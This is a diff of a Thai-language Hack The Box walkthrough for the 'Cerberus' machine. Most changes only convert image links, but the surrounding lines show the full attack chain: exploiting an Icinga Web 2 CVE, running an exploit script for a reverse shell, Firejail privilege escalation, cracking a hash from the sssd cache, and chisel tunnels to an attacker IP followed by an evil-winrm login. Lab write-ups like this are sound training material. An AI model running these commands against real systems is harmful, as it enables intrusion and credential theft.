@@ -19,19 +19,19 @@ Nmap done: 1 IP address (1 host up) scanned in 162.89 seconds
 
 ตวจสอบหน้า Website จะพบว่ามีการใช้ http://icinga.cerberus.local:8080/icingaweb2 
 
-![[Challenge/HTB Challenge/Cerberus/IMG/001.png]]
+![](./IMG/001.png)
 
 จะเห็นได้ว่ามีการใช้งาน App ชื่อ icinga ซึ่งถ้าดูจะเป็นเวอร์ชัน 2 และมีช่องโหว่ที่ใช้ได้อยู่จำนวน 3  ช่องโหว่ตามภาพด้านล่าง 
 
-![[Challenge/HTB Challenge/Cerberus/IMG/002.png]]
+![](./IMG/002.png)
 
 ## Host Exploit 
 เราสามารถใช้ช่องโหว่ Icinga Web 2.10 - Arbitrary File Disclosure ซึ่งเป้น CVE-2022-24716 
-![[Challenge/HTB Challenge/Cerberus/IMG/003.png]]
+![](./IMG/003.png)
 
 หากตรวจสอบไฟล์ที่สำคัญของแอพดังกล่าวจะพบว่ามีไฟล์ที่สำคัญตามลิ้งนี้ https://icinga.com/docs/icinga-web/latest/doc/03-Configuration/ 
 
-![[Challenge/HTB Challenge/Cerberus/IMG/004.png]]
+![](./IMG/004.png)
 
 
 จากนั้นลองตรวจสอบแต่ละไฟล์จะพบว่ามีข้อมูลสำคัญอยู่ภายใต้ resources.ini 
@@ -48,7 +48,7 @@ use_ssl = "0"
 ```
 
 
-![[Challenge/HTB Challenge/Cerberus/IMG/005.png]]
+![](./IMG/005.png)
 
 ## Exploit to Reverse shell using cve 
 ```python
@@ -56,8 +56,8 @@ python3 51586.py -u 'http://icinga.cerberus.local:8080' -U 'matthew' -P 'IcingaW
 ```
 
 
-![[Challenge/HTB Challenge/Cerberus/IMG/006.png]]
-![[Challenge/HTB Challenge/Cerberus/IMG/007.png]]
+![](./IMG/006.png)
+![](./IMG/007.png)
 
 
 ## Priv Escalation 
@@ -66,7 +66,7 @@ python3 51586.py -u 'http://icinga.cerberus.local:8080' -U 'matthew' -P 'IcingaW
 find / -type f -perm -u=s -ls 2>/dev/null
 ```
 
-![[Challenge/HTB Challenge/Cerberus/IMG/008.png]]
+![](./IMG/008.png)
 
 Firejail Local Privilege Escalation 
 https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
@@ -78,7 +78,7 @@ chmod +x fire.py
 ./fire.py
 ```
 
-![[Challenge/HTB Challenge/Cerberus/IMG/009.png]]
+![](./IMG/009.png)
 
 จากนั้นเปิดอีก terminal เพื่อรันสิทธิ ROOT
 
@@ -94,7 +94,7 @@ su -
 
 เราสามารถตรวจสอบไฟล์แต่ละไฟล์ซึ่งเป็น Cache ของ sssd ซึ่งภายใต้ไฟล์ cache_cerberus.local.ldb เราตรวจพบข้อมูลที่มีความน่าสนใจ ซึ่งเป็นค่า hash ของระบบ
 
-![[Challenge/HTB Challenge/Cerberus/IMG/010.png]]
+![](./IMG/010.png)
 
 
 ```bash
@@ -103,7 +103,7 @@ echo '$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1F
 john hash  --wordlist=/usr/share/wordlists/rockyou.txt 
 ```
 
-![[Challenge/HTB Challenge/Cerberus/IMG/012.png]]
+![](./IMG/012.png)
 
 จากภาพเราจะได้รหัสผ่านดังต่อไปนี้ 
 ```bash
@@ -120,7 +120,7 @@ chisel server --port 1111 --reverse # Attacker host
 ./chisel client 10.10.14.9:1111 R:5985:172.16.22.1:5985 # Victim host
 ```
 
-![[Challenge/HTB Challenge/Cerberus/IMG/013.png]]
+![](./IMG/013.png)
 
 จะเห็นได้ว่า user ดังกล่าวสามารถใช้บน winrm ได้ จากนั้นรัน 
 
@@ -134,5 +134,3 @@ evil-winrm -i 127.0.0.1 -u matthew -p '147258369'
 
 .\chisel.exe client 10.10.14.9:2222 R:socks # Victom host
 ```
-
-
